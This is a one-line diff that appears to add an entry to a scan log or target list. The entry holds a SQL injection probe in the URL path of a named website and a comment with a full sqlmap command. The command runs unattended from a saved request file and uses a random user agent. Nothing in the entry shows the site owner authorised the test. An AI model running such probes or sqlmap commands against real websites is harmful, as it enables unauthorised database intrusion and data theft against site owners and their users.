@@ -1,0 +1,1 @@
+http://www.huzhan.com:80/code/key/index/1'"1000 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\016_SQL_Injection_path_3885561309093168626.txt --batch --smart --random-agent --output-dir sqlmap_output\016_3885561309093168626
